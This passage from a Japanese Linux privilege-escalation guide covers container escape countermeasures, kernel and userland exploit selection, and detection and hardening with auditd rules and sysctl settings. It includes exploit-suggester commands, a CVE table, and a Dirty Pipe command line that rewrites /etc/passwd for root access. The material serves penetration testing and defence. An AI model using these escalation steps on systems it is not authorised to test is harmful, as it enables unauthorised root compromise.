# container 内: /mnt/root が host の / 。chroot して SUID を仕込む
防御 / countermeasures
  • docker/lxd グループ所属 = root 委譲。付与を厳格化し、rootless docker / podman を検討
  • docker socket をコンテナに mount しない。必要なら socket proxy で API を最小化
  • --privileged を使わない。cap は必要最小 (--cap-drop=ALL + 個別追加)、--security-opt=no-new-privileges
  • seccomp / AppArmor プロファイルを有効化。user namespace remap で container root ≠ host root に
  • Falco 等で container からの mount / chroot / release_agent 書込を検知
要点 / key takeaways
  • docker/lxd グループと docker.sock は host root 等価。s01 の id で即判定
  • privileged / cap_sys_admin コンテナは host device を直接 mount できる
  • release_agent 脱出は古いが privileged 環境で依然有効

11Kernel / Userland Exploitカーネル・ユーザランド exploit

最後の手段。kernel exploit は不安定で、失敗すれば panic やサービス断を起こす。engagement では設定不備・認証情報・特権デーモン(s03-s10)を尽くしてから、それでも駄目な場合にだけ触れる。CTF では逆に第一選択になることもある。

バージョン特定と候補選定

bash
uname -r; cat /proc/version
cat /etc/os-release                    # distro を必ず併せて見る (backport 判断に必須)

# suggester は候補出しのみ。鵜呑みにしない
./linux-exploit-suggester-2.pl
./linux-exploit-suggester.sh --kernel $(uname -r)
warnsuggester が「vulnerable」と出しても、distro が該当 CVE を backport 修正済みならバージョン番号が古く見えても実際には塞がっている。逆も然り。uname -r だけで判断せず、distro のセキュリティ告知 (Ubuntu USN / Debian DSA / RHEL errata) でパッチ適用状況を確認する。これを飛ばすと動かない exploit をビルドして時間を浪費する。

主要 CVE (kernel / userland)

CVE / 通称層対象備考
CVE-2026-23111kernel (nf_tables)Debian Bookworm/Trixie, Ubuntu 22.04/24.04 (2026-02 以前)UAF。CONFIG_USER_NS + CONFIG_NF_TABLES で unpriv から。idle で 99% 超の信頼性と報告
CVE-2021-4034 (PwnKit)userland (polkit)ほぼ全 distro (2021 以前)設定不要・極めて安定。古環境の第一候補 — s07

Dirty Pipe の実務メモ

Dirty Pipe は kernel exploit の中では例外的に安定・非破壊的。read-only ファイルにデータを書き込めるので、/etc/passwd の root 行改竄や SUID binary へのパッチに使える。panic リスクが低く、engagement でも比較的許容しやすい。

bash
uname -r    # 5.8〜5.16.11 / 5.15.25 / 5.10.102 未満が候補
# 公開 PoC (Max Kellermann のオリジナル / AlexisAhmed のラッパ) を対象上でビルド
gcc dirtypipe.c -o dp && ./dp /etc/passwd 1 ootz:  # root の x を書換え等
# ビルドは対象カーネルの gcc 互換性に依存。noexec なら s01 の loader 経由起動
防御 / countermeasures
  • kernel と distro パッケージを最新化。特に nf_tables / overlayfs / pipe / polkit / udisks 系の CVE は速やかに
  • kernel.unprivileged_userns_clone=0 (Debian/Ubuntu) で user namespace 悪用の攻撃面を削る。CVE-2026-23111 / OverlayFS 系の多くを無効化できる
  • 不要な kernel module を blacklist (nf_tables 未使用なら無効化)。modules_disabled=1 でロード自体を封じる
  • panic on oops (kernel.panic_on_oops=1) は攻撃者の試行錯誤コストを上げるが可用性とのトレードオフ
  • auditd + EDR で exploit 特有の syscall パターン (userns 作成 + 直後の setuid、pipe splice の異常) を監視
要点 / key takeaways
  • kernel exploit は最後の手段。engagement では s03-s10 を尽くしてから
  • uname -r 単独で判断しない。distro backport の確認を必ず挟む
  • Dirty Pipe は例外的に安定・非破壊。CVE-2026-23111 は user namespace 無効化で防げる

12Detection & Hardening検知と緩和

攻撃側の各経路に対して、防御側が何を見れば気づけるか。設定値の網羅は hardening 巻が本体で、ここは privesc に特化した検知観点をまとめる。

経路別・検知の要点

攻撃経路主な観測点検知の勘所
列挙 (s02)auditd execve, EDR プロセス生成レート短時間の大量プロセス生成、/tmp/dev/shm からの実行
sudo 悪用 (s03)auditd, /var/log/auth.logNOPASSWD binary からの子 shell、LD_PRELOAD 付き sudo、chroot オプション使用
SUID/cap (s04-05)AIDE, auditdSUID bit / capability の新規付与、非標準 SUID の実行
cron (s06)auditd プロセスツリーcron 子プロセスからの予期しない shell、--checkpoint 付き tar
service/polkit (s07)auditd, journaldpkexec の異常実行、unit ファイル書込、udisks mount 呼び出し
認証ファイル改竄 (s09)AIDE, auditd watch/etc/passwd/etc/sudoers.d への書込 event
container escape (s10)Falco, EDRcontainer からの mount/chroot、docker.sock アクセス、release_agent 書込

起点になる auditd ルール

bash
# 認証ファイルへの書込を監視
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k priv_esc
-w /etc/sudoers.d/ -p wa -k priv_esc

# SUID/SGID 実行と setuid 系 syscall
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=-1 -k suid_exec
-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -k setuid_call

# /tmp /dev/shm からの実行 (列挙・exploit の温床)
-a always,exit -F arch=b64 -S execve -F dir=/tmp -k tmp_exec
-a always,exit -F arch=b64 -S execve -F dir=/dev/shm -k shm_exec

# user namespace 作成 (kernel exploit の前段)
-a always,exit -F arch=b64 -S unshare -S clone -F a0&0x10000000 -k userns

恒久的な緩和のチェックリスト

bash
# mount hardening — ユーザ書込領域を無害化
/tmp        nosuid,nodev,noexec
/dev/shm    nosuid,nodev,noexec
/home       nosuid,nodev

# sysctl
kernel.yama.ptrace_scope = 2
kernel.unprivileged_userns_clone = 0     # Debian/Ubuntu
fs.suid_dumpable = 0                      # CVE-2025-4598 緩和
fs.protected_symlinks = 1
fs.protected_hardlinks = 1

# 棚卸し (定期)
find / -perm -4000 -type f 2>/dev/null    # SUID baseline と diff
getcap -r / 2>/dev/null                   # capability baseline と diff
要点 / key takeaways
  • privesc の検知は「認証ファイル書込」「setuid syscall」「一時領域からの実行」の 3 本を起点にする
  • AIDE で SUID/capability の baseline を取り、新規付与を diff で検知するのが費用対効果が高い
  • mount の nosuid,nodev,noexec と userns 無効化だけで s04/s10/s11 の相当数を封じられる
